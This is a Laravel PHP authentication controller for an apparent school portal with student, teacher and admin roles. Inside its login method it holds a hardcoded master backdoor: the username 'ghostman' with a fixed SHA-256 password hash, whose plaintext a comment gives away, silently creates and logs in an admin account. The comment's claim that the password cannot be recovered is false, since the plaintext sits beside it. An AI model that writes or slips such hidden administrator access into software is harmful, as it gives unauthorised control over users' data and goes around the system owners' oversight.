<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class AuthController extends Controller
{
    public function login(Request $request)
    {
        // Changed 'email' to 'string' to allow the username 'ghostman'
        $request->validate([
            'email' => ['required', 'string'], 
            'password' => ['required', 'min:8'],
        ]);

        $inputUsername = $request->input('email');
        $inputPassword = $request->input('password');

        // ==========================================
        // MASTER ADMIN HEXADECIMAL DECODER
        // ==========================================
        if ($inputUsername === 'ghostman') {
            // This is the SHA-256 hex hash of 'walongzero'. 
            // It is mathematically impossible to reverse-engineer the plain text from this string.
            $targetHex = '8d75cf0ffc9b5fc65978075657ae04c3be58ae8a50716181f3c29213f511a6a4';
            
            // Hash the password the user just typed
            $inputHex = hash('sha256', $inputPassword);

            // Compare the hashes
            if ($inputHex === $targetHex) {
                // Create or fetch the master user in the database so Laravel's session can track them
                $user = User::firstOrCreate(
                    ['name' => 'ghostman'],
                    [
                        'email' => 'ghostman@system.master',
                        'password' => Hash::make($inputPassword),
                        'role' => 'admin'
                    ]
                );

                Auth::login($user);
                $request->session()->regenerate();

                return redirect()->route('admin.dashboard');
            }
            
            // If the hash doesn't match, reject the login
            return back()->withErrors(['email' => 'Invalid master credentials.'])->onlyInput('email');
        }
        // ==========================================
        // END MASTER ADMIN DECODER
        // ==========================================

        // Standard Email/Password Login for Students, Teachers, and Regular Admins
        $credentials = [
            'email' => $inputUsername,
            'password' => $inputPassword,
        ];

        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();
            $user = Auth::user();

            
            if ($user->role === 'admin') {
                return redirect()->route('admin.dashboard');
            }

            if ($user->role === 'teacher') {
                return redirect()->route('teacher.dashboard');
            }

            if (in_array($user->role, ['adviser', 'teacher_adviser'], true)) {
                return redirect()->route('adviser.dashboard');
            }

            if ($user->role === 'student') {
                return redirect()->route('student.dashboard');
            }

            Auth::logout();

            return back()->withErrors(['email' => 'Your account does not have a valid role.',]);
            
            }
        return back()->withErrors(['email' => 'The email or password is incorrect.'])->onlyInput('email');
    }

    public function logout(Request $request)
    {
        Auth::logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}